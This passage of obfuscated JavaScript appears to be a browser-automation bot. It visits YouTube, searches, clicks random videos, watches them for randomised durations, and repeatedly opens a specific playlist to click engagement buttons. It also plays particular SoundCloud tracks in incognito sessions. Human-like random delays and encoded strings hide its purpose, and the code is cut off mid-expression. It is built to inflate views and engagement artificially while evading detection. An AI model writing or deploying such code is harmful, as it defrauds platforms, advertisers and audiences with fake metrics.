const a1 = d,
  Z = c,
  Y = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2 * 0x2f4 + -0x27 * 0xb0 + 0x14e9))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0xfad * 0x2 + 0x1 * -0x1503 + 0xa79 * 0x5), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x2f2 + -0x3c7 * 0x7 + -0x1d63 * -0x1);
    let h = e[f];
    if (b['piQzgF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2 * 0xbb9 + -0xaa7 + 0x2219, s, t, u = 0x4 * -0x29c + 0x26ef + -0x5b3 * 0x5; t = n['charAt'](u++); ~t && (s = r % (-0x9 * -0x2fe + 0x14d + -0x1c37) ? s * (-0x1503 + 0x2 * 0xf4e + 0x959 * -0x1) + t : t, r++ % (0x73 * -0x55 + 0x17e9 + -0x1 * -0xe4a)) ? p += String['fromCharCode'](0x48a * 0x2 + -0x55 * 0x11 + -0x18 * 0x1a & s >> (-(-0x227f + -0x9a3 + -0x2c24 * -0x1) * r & 0xb60 + 0x1 * 0x466 + -0x20 * 0x7e)) : -0x2574 + -0x12d0 + -0x115 * -0x34) {
          t = o['indexOf'](t);
        }
        for (let v = -0x2 * 0xd51 + -0x1 * -0xd63 + 0xd3f, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x2211 + 0x24f6 + -0x46f7 * 0x1))['slice'](-(0x1c6 + 0xe26 + 0x1 * -0xfea));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2 * 0xeb3 + -0x2 * 0xefd + 0x94,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1ce7 * -0x1 + 0x20f7 + -0x410; u < -0x7e * 0x9 + 0x1 * 0xf85 + 0x171 * -0x7; u++) {
          p[u] = u;
        }
        for (u = -0x1d59 + 0x950 + -0x1409 * -0x1; u < 0xf8e + -0x13 * -0x9 + -0x513 * 0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x12dc + -0x25bd + 0x13e1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1eae + -0x1013 + 0x2ec1 * 0x1, q = 0x21ee + 0xc13 + -0x2e01;
        for (let v = -0x1 * -0x249e + -0xb * -0x233 + -0x3 * 0x1445; v < n['length']; v++) {
          u = (u + (-0x15ae + -0x1da7 + -0x1 * -0x3356)) % (-0x1094 + -0x2320 + -0x1 * -0x34b4), q = (q + p[u]) % (0x53 * 0x33 + -0x1 * -0x25b0 + -0x5 * 0xaa5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * -0x1e0b + -0x24fb + 0x4406)]);
        }
        return t;
      };
      b['pnKaNv'] = m, c = arguments, b['piQzgF'] = !![];
    }
    const j = e[0x9f2 + 0x10a3 * 0x1 + -0x1a95 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['ANvrcf'] === undefined && (b['ANvrcf'] = !![]), h = b['pnKaNv'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x153 * -0xad + 0x8f74 + -0x1 * -0xcad3 + (0x1b3b * 0x1 + -0xc5 * 0x16 + -0x27 * -0x13d) * random()) : await standardWaitForNetIdle(f), await wait(-0x227f + -0x9a3 + -0x3faa * -0x1 + (0x16c0 + 0x1 * 0x8cc + -0x1a * -0x4a) * random()), -0x2574 + -0x12d0 + -0xd7 * -0x43;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x2 * 0xd51 + -0x1 * -0xd63 + 0x20c7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2211 + 0x24f6 + -0x4706 * 0x1;
}
async function randomWait() {
  return await wait(0x1c6 + 0xe26 + 0x1 * 0x39c + (0x2 * 0xeb3 + -0x2 * 0xefd + 0x141c) * random()), 0x1ce7 * -0x1 + 0x20f7 + -0x40f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x7e * 0x9 + 0x1 * 0xf85 + 0xb17 * -0x1, -0x1d59 + 0x950 + -0x358 * -0x6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xbaab + -0x52 * -0x19 + -0x27b3 * -0x1) * getRandomInt(0x12dc + -0x25bd + 0x12e3, -0x1eae + -0x1013 + 0x1763 * 0x2), h)), 0x21ee + 0xc13 + -0x2e00;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x249e + -0xb * -0x233 + -0x3 * 0x1445;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x15ae + -0x1da7 + -0x1 * -0x3356]['split']('\x20');
    for (let k = -0x1094 + -0x2320 + -0x2 * -0x19da; k < i['length']; k += 0x53 * 0x33 + -0x1 * -0x25b0 + -0x1 * 0x3637)
      j += i[k] * h[i[k + (0x1 * -0x1e0b + -0x24fb + 0x4307)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels[R(0x8, 'TaXx')]()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x9f2 + 0x10a3 * 0x1 + -0x1a8f * 0x1)['map'](l => Array['from'](l['children']))['flat'](-0x240b + -0x815 + 0x2c21)['map'](l => l['childNodes'][-0x5d5 + -0x2359 * 0x1 + -0x32b * -0xd][S(0x19)][-0x83a + 0x1 * 0x239b + -0x1b61]['childNodes'][0x1f * -0xff + -0x23c + 0x211e]['childNodes'][-0x3 * 0xa1b + 0x6 * 0x3eb + 0x15 * 0x53]['childNodes'][-0x57d + 0xd1b + -0x79d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1188 + 0x1 * 0x403 + 0x1 * 0x116d, -0x751 * -0x1 + -0x24dd + 0x574 * 0x9)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x4fb0 + -0x3c91 + 0x2779);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * -0x626b + -0x2904 + -0x5 * -0x4ac3) * getRandomInt(-0xd * -0x2be + -0x4 * 0x434 + -0x1e2 * 0xa, 0xba5 + -0x21a9 + 0x1 * 0x1609), h);
  return await wait(i), 0x284 + 0x21e * -0x1 + -0x65 * 0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x17a6 + 0x9 * -0x112 + 0x2148]['children'][0x901 * -0x2 + 0xb95 + 0x66d]['children'][-0x89d + -0x25b2 + 0x2e4f]['children'][-0x260a + -0x3 * -0x2b + -0x3 * -0xc83]['children'][0x10d * -0x1 + 0x21b9 + -0x4 * 0x82b]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x8f + 0x8d7 + -0x965;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x2272 + -0x4 * -0x4f8 + 0xef6 + (0x434 * 0x1 + -0x1d2 * 0x1 + -0x38 * 0xa) * random()
  }), await wait(-0x235d + 0xdf + 0x2472 + (-0x1 * 0x196a + -0x36 * 0x75 + -0x304 * -0x11) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * 0x15d7 + 0x2074 + -0x3649]['childNodes'][-0x215b + -0x1e83 + 0x3fdf]['childNodes'][-0x2 * -0x2a3 + -0x1813 + 0x12ce]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1e42 + -0x1d8f + -0xae]['childNodes'][0x16c9 + 0x1ccb + -0x2 * 0x19ca]['childNodes'][-0x17b6 + 0xea7 + 0x911]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x11e5 + -0xd93 + -0x451),
          r = -0x26cd + 0xd * -0x133 + 0x3664;
        for (let u = 0x17 * -0xd9 + 0x2473 + -0x10f4; u < q['length']; u += -0x1d5b + 0xb4e * -0x2 + 0x33f9)
          r += q[u] * k[q[u + (-0x9e4 * -0x3 + -0xbb3 + -0x64 * 0x2e)]];
        return r;
      }(n);
  });
  await wait((-0x34 * 0x3b + -0x3c31 + 0x82c5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1a9e1 * 0x1 + -0x10219 + 0x4298) * getRandomInt(-0x1 * 0x351 + -0x1d84 + 0xaf2 * 0x3, -0x3a5 + 0x23d5 * -0x1 + 0x2784), h + (-0x26c6 + 0x111 * 0xd + -0x1 * -0x2c71));
  return await wait(i), -0x15f5 + 0xdc9 + 0x82d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x2f2 + -0x3c7 * 0x7 + -0x1d63 * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x2f2 + -0x3c7 * 0x7 + -0x1d63 * -0x1);
    let h = e[f];
    if (c['zIOFKu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2 * 0xbb9 + -0xaa7 + 0x2219, r, s, t = 0x4 * -0x29c + 0x26ef + -0x5b3 * 0x5; s = m['charAt'](t++); ~s && (r = q % (-0x9 * -0x2fe + 0x14d + -0x1c37) ? r * (-0x1503 + 0x2 * 0xf4e + 0x959 * -0x1) + s : s, q++ % (0x73 * -0x55 + 0x17e9 + -0x1 * -0xe4a)) ? o += String['fromCharCode'](0x48a * 0x2 + -0x55 * 0x11 + -0x18 * 0x1a & r >> (-(-0x227f + -0x9a3 + -0x2c24 * -0x1) * q & 0xb60 + 0x1 * 0x466 + -0x20 * 0x7e)) : -0x2574 + -0x12d0 + -0x115 * -0x34) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2 * 0xd51 + -0x1 * -0xd63 + 0xd3f, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x2211 + 0x24f6 + -0x46f7 * 0x1))['slice'](-(0x1c6 + 0xe26 + 0x1 * -0xfea));
        }
        return decodeURIComponent(p);
      };
      c['bXhowp'] = i, b = arguments, c['zIOFKu'] = !![];
    }
    const j = e[0x2 * 0xeb3 + -0x2 * 0xefd + 0x94],
      k = f + j,
      l = b[k];
    return !l ? (h = c['bXhowp'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  const T = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x3 * -0x60a + 0x1523 + -0x305), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + T(0x15) + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1c * -0xb1 + 0x120b * 0x2 + 0x1 * -0x2bba + (0xb * -0x53 + 0x176b + 0xff2 * -0x1) * Math['random']());
    });
  }, -0x18ca + -0x166 + -0x18 * -0x23b);
  await wait(-0x68c8d * 0x1 + -0x6fe4a + 0x27 * 0x76f1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x26 * 0x458 + 0xb * 0x17b7 + -0xbf8d) * getRandomInt(-0x2 * 0x12aa + -0x355 * 0x1 + 0x28ad, 0x1 * -0xa3c + 0x1759 * 0x1 + 0x11 * -0xc4)), clearInterval(h), -0x1b27 + -0x1528 + 0x4 * 0xc14;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2216 * -0x1 + 0x161 * 0xd + 0x1029;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x21f8 + 0x1ee9 * 0x1 + -0xe * -0x38;
    await randomWait();
  }
  return 0x1 * 0xb66 + -0xaeb + -0x2 * 0x3d;
}

function fetchRandomSC() {
  const U = b;
  return Math['random']() <= -0x3c3 * -0x2 + -0x85 * 0x1f + 0x895 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + U(0xf, 'cYqZ') + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xb33 + -0x175d + 0xc2a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x45a * 0x4 + 0xaad * 0x1 + -0x6bb * -0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x348 + -0x1 * -0x10 + -0x2 * -0x19c;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * -0x715a + -0x1 * 0xbc57 + -0xf67 * -0x1f + getRandomInt(-0x162 * -0x16 + 0x1ae6 + 0x2 * 0xa3, -0x54e5 + -0x7c39 + 0x1464e * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1617 + -0x3b * -0x49 + -0x7 * 0x58f), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x162a * -0x1 + 0x2 * 0xcd9 + -0x2fdc;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x37c + 0x3b * -0x47 + 0xce1, 0x1bf2 + 0xb91 + -0x2751)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x929 + 0x1 * -0x1906 + 0x17ad * 0x1 + floor((-0x3c9 + -0x686 + 0x3 * 0x4bd) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && V(0x0) == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x1 * -0x56e27c42 + 0x17e31018 + 0xbeff6c2a),
          -0x1 * 0x869151 + 0x7d552e + -0x893c23 * -0x1,
          0x8 * 0xf37 + 0x426d + -0x3c25,
          -0x2d7 + -0x1 * 0x4dc + -0x833 * -0x1
        ], y = [
          0x388 + 0x316 * -0x2 + 0x14 * 0x23,
          -0x38b * 0xb + 0x121 * -0x21 + 0x4c4a,
          -0x55f * -0x7 + -0x1 * 0x22a + -0x2367,
          0x1c16 + 0x3cb + -0x1fe1 * 0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0xde * 0x13 + 0x2 * 0xd88 + -0xa95)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x14cb * -0x1 + -0x206d + 0xba2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1cd * -0xb + -0x1 * -0x1f15 + -0xb46 * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const W = b;
              J ? (A[-0x1d50 + 0xd1d + 0x1 * 0x1033] = A[0x6 * 0x44a + -0x1 * -0x514 + -0x1ec0] = A[0xa04 * -0x1 + 0x1 * -0x22d3 + 0x2cd8] = A[-0x2 * 0x73b + 0x1 * -0x1771 + 0x795 * 0x5] = A[-0x270f + -0xc6d * -0x2 + 0xe38] = A[0x54e * 0x2 + -0x279 + -0x81f * 0x1] = A[-0x199d + -0x673 + -0x1 * -0x2015] = A[-0x1c16 + 0xe7a + -0x6d1 * -0x2] = A[-0x231e + 0x252c * 0x1 + 0x1 * -0x207] = A[0x1a * 0x112 + -0x1a0d + 0x1 * -0x1bf] = A[0x13 * -0x15f + -0x1 * -0x19ed + 0x29] = A[-0x2 * -0x1034 + -0x7 * 0x52b + 0x19 * 0x27] = A[0x15e4 + 0x1897 + -0x2e70] = A[0x52b * -0x4 + 0x1556 + 0x4f * -0x2] = A[-0x502 * 0x1 + -0x1126 + 0x3 * 0x767] = A[0x197 + -0x63a * -0x3 + -0x1437] = A[-0x247d + 0x14fe + 0xf8e] = 0x1f6c + -0x5f3 * -0x5 + -0x3d2b, this['blocks'] = A) : this['blocks'] = [
                -0x3 * 0x60a + 0x1269 * 0x1 + 0x3 * -0x19,
                0x1b0c + -0x240e + 0x902,
                0x1611 + -0x3d5 + -0x185 * 0xc,
                0x1 * -0xe61 + -0x3e * 0x16 + 0x13b5,
                0x18d4 + 0x356 + -0x1c2a,
                0xe6b + 0x17b * 0x7 + 0x4 * -0x632,
                0x1ec * 0x8 + -0x1f29 + 0x9 * 0x1c1,
                -0x1 * -0x125c + 0x1 * -0x92b + -0x1 * 0x931,
                -0xe69 + 0xdb9 * -0x1 + 0x1c22,
                -0xb29 + 0xc * -0x32c + 0x3139,
                0x3 * -0x971 + 0xb27 + -0x274 * -0x7,
                -0x1 * -0x8cb + -0x537 + -0x4 * 0xe5,
                0x150d * 0x1 + -0xf * 0x251 + 0xdb2 * 0x1,
                -0x14f2 + 0x1615 * 0x1 + -0x123,
                0xa1e + -0x59 * 0x61 + 0x179b,
                -0x1 * -0x22f4 + -0x222b * 0x1 + -0xc9,
                -0xe41 * -0x1 + -0xfb * 0x1 + -0xd46
              ], this['h0'] = 0x3b77b59f + -0x8af0d064 + 0xb6be3dc6, this['h1'] = -0x279b61a8 * 0x6 + 0x5 * -0x3d7f9993 + 0x310eff558, this['h2'] = -0x57c7e04f + 0x19136a41 + 0x115a2 * 0xc6a6, this['h3'] = 0x5 * 0x1dcd0d5 + -0x76ab * -0x482 + 0x4cb5177, this['h4'] = -0xb3575bae + 0xde111c9f + -0xa34e011 * -0xf, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1ca2 + 0xdb * -0xd + -0x1183 * 0x1, this[W(0x9, '#wqE')] = this['hashed'] = -0x9c * -0x3d + -0xf80 + 0xad6 * -0x2, this['first'] = 0xf * 0x14b + -0x1 * 0x206b + 0xd07;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xdb5 + -0x6b7 * -0x3 + 0xe * -0x26b, O = J['length'] || -0x4 * -0x722 + 0x16bd + 0xa41 * -0x5, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x236 + -0x246f + 0x26a5, P[0x218f + 0x1340 + -0x34cf] = this['block'], P[-0x105 * -0x18 + 0x2 * -0x97 + -0x173a] = P[-0x845 * 0x4 + -0x2af * 0xc + 0x4149] = P[-0x108b + -0x2af + 0x133c] = P[0xf1 * -0x7 + 0x1 * 0x1b01 + -0x1 * 0x1467] = P[0x1468 + 0x820 + -0x1c84] = P[-0x1 * 0x1bf5 + 0x1d * 0x56 + 0x123c] = P[0x19a1 + 0x1dc1 + 0x1 * -0x375c] = P[0xa0 * 0x1b + 0x1608 * -0x1 + 0x52f] = P[-0xa * 0x2d1 + 0x1 * -0xef + 0x1d21] = P[0x1b4 * -0x2 + -0x1bd8 + 0x1f49] = P[-0x7ed + -0x84e + -0x253 * -0x7] = P[-0x4df * -0x7 + 0x2 * -0xa91 + -0xcec] = P[0x5b * 0x25 + 0x1cb + -0x1 * 0xee6] = P[0x1848 + 0x18a6 + -0x123 * 0x2b] = P[-0x20b4 + 0xb3d + 0x1585] = P[0x1 * 0x2649 + 0x8de + -0x2f18] = 0x740 + 0x46 * -0x9 + -0x2 * 0x265), K) {
                    for (N = this['start']; M < O && N < 0x9d6 * -0x1 + -0x1 * 0xfa + 0xb10; ++M)
                      P[N >> -0x447 + 0x120f + 0x2b * -0x52] |= J[M] << y[0x1 * 0x2e2 + -0x1 * 0x17c + -0x163 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2583 + -0x3 * -0x74c + 0xfdf; ++M)
                      (L = J['charCodeAt'](M)) < 0x3af + -0x21b4 + 0x1e85 ? P[N >> -0x8 * 0x3e5 + 0x194c + -0x2 * -0x2ef] |= L << y[-0xeb6 + -0x15a * 0xd + 0x204b & N++] : L < 0x237f + -0xbd2 * 0x1 + -0xfad ? (P[N >> -0x236a + -0x98f * -0x4 + -0x3 * 0xf0] |= (-0x6 * 0x4f7 + 0x369 + 0x1b21 | L >> 0x20f * -0x4 + 0x1f49 * 0x1 + -0x83 * 0x2d) << y[-0x19a + -0x109 * 0x7 + 0x8dc & N++], P[N >> -0x25fa + -0x65 * 0x29 + 0x127 * 0x2f] |= (-0x243 * -0x11 + -0xd * -0xda + 0x10b * -0x2f | 0x168e + 0x12ee + -0x293d & L) << y[-0x1b * 0x6d + -0x35a + -0x13d * -0xc & N++]) : L < 0x6ab * -0xd + -0x118ba * 0x1 + 0x24769 || L >= -0x3d * 0x6fd + 0x4bd * 0x52 + 0x1 * 0x105bf ? (P[N >> 0x1 * 0x16ef + 0x110e + 0x5 * -0x7ff] |= (0x1093 * -0x1 + 0x3 * 0x5e7 + -0x42 | L >> -0x647 * 0x1 + 0x1 * -0xb2 + 0x705) << y[-0x14a + 0xf * 0x277 + -0x23ac & N++], P[N >> 0x1265 + -0x1819 + 0x2 * 0x2db] |= (0x81 * 0x48 + -0x1395 + 0x1033 * -0x1 | L >> 0x82b * 0x3 + -0x2417 + -0x2e7 * -0x4 & 0x14e9 + 0x250c + 0xa6 * -0x59) << y[0x508 + 0x1efd * 0x1 + -0x2402 & N++], P[N >> 0x8ff + 0x7 * 0x7a + -0xc53] |= (0x364 + -0x61 * 0x31 + -0x1 * -0xfad | 0x2619 + 0x419 + -0x29f3 & L) << y[-0x1dea + 0x18e2 + 0x1 * 0x50b & N++]) : (L = 0x20e3 * -0x1 + 0x17715 + 0x176 * -0x3b + ((-0x5 * -0x67f + -0x21 * -0xb5 + -0x7 * 0x767 & L) << -0x23b6 + 0x1a4e + 0x3e * 0x27 | -0x1451 + 0xb1f + -0xd31 * -0x1 & J['charCodeAt'](++M)), P[N >> 0x1fae + 0x2 * 0xa6c + 0xd21 * -0x4] |= (0x1323 + 0x1c05 + 0x33 * -0xe8 | L >> -0x250f + -0x258 * 0x1 + 0x2779 * 0x1) << y[0x1d1 + -0x1 * -0x1841 + 0x1a0f * -0x1 & N++], P[N >> 0x1 * 0x212b + 0x99e * 0x1 + -0x1 * 0x2ac7] |= (0x55b + 0x12c5 + 0x54 * -0x48 | L >> 0xe5b + 0xd20 + 0x1b6f * -0x1 & 0x1ec5 + 0x1993 + 0x1 * -0x3819) << y[0xf67 + -0x1b22 * -0x1 + -0x2a86 & N++], P[N >> 0x142d + 0x149a + 0xd5 * -0x31] |= (-0x89 * -0x3a + -0x13c1 + -0xac9 | L >> -0xd8 + -0x5 * -0x27a + 0xb84 * -0x1 & -0xd0b + -0x2123 + -0x2e6d * -0x1) << y[0x165d + -0x12b * 0x1 + 0x1d * -0xbb & N++], P[N >> -0x1 * -0x17e + 0x58 * -0x2d + 